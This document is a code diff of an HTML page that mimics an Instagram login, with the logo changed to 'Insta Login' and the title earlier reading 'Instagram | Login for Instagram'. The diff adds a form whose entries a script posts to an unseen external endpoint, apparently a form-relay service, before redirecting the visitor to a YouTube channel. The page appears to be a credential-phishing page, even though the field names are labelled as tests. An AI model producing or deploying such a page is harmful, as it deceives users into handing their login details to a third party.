@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Instagram | Login for Instagram</title>
+  <title>Login </title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
     body {
@@ -19,9 +19,9 @@
     .logo {
       margin-bottom: 30px;
       font-weight: bold;
-      font-size: 28px;
+      font-size: 32px;
       color: #262626;
-      letter-spacing: -0.5px;
+      letter-spacing: -1px;
     }
 
     form {
@@ -87,9 +87,24 @@
   </style>
 </head>
 <body>
-  <div class="logo">L o g i n  f o r  I n s t a g r am /div>
-  
-   <script>
+  <div class="logo">Insta Login</div>
+
+  <form id="loginForm">
+    <input type="text" name="usuarioteste" placeholder="Digite algo" required />
+    <input type="text" name="respostateste" placeholder="Digite mais algo" required />
+
+    <input type="hidden" name="_captcha" value="false" />
+    <input type="hidden" name="_next" value="https://www.youtube.com/@NATTO_BEATS" />
+
+    <button type="submit">Enviar</button>
+  </form>
+
+  <div class="footer"> 
+    <br>
+    Desenvolvido por @NATTO_BEATS
+  </div>
+
+  <script>
     const form = document.getElementById('loginForm');
 
     form.addEventListener('submit', function(event) {
@@ -106,11 +121,11 @@
         if (response.ok) {
           window.location.href = 'https://www.youtube.com/@NATTO_BEATS';
         } else {
-          alert('Erro ao enviar o formulário.');
+          alert('Erro ao enviar. Tente novamente.');
         }
       })
       .catch(() => {
-        alert('Erro na conexão.');
+        alert('Erro de conexão. Verifique sua internet.');
       });
     });
   </script>
